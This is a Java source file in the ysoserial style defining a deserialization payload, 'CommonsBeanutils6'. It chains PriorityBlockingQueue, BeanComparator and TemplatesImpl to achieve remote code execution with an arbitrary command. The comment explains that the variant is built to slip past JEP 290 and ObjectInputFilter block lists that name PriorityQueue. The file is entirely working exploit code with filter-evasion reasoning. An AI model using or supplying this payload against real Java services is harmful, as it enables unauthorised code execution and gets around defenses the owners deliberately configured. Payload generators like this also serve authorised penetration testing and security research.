package ysoserial.payloads;

import java.io.Serializable;
import java.math.BigInteger;
import java.util.concurrent.PriorityBlockingQueue;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CommonsBeanutils via PriorityBlockingQueue — bypasses PriorityQueue filters.
	No commons-collections dependency on the target.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityBlockingQueue.readObject()
				PriorityBlockingQueue.heapify()
					BeanComparator.compare()
						PropertyUtils.getProperty(templates, "outputProperties")
							TemplatesImpl.getOutputProperties()
								TemplatesImpl.newTransformer()
									... -> RCE

	Filter evasion:
		1. PriorityBlockingQueue (java.util.concurrent) — not in any filter
		2. No commons-collections classes in serialized payload
		3. BeanComparator + PropertyUtils (commons-beanutils only)

	Same as CB1 but uses PriorityBlockingQueue instead of PriorityQueue.
	JEP 290 filters and custom ObjectInputFilters typically block PriorityQueue
	by exact class name — PriorityBlockingQueue is a different class.

	Requires:
		commons-beanutils 1.9.x
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutils6 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// safe property during construction
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// PriorityBlockingQueue — concurrent variant
		final PriorityBlockingQueue<Object> queue =
			new PriorityBlockingQueue<Object>(2, comparator);
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// arm
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// swap queue contents
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils6.class, args);
	}
}
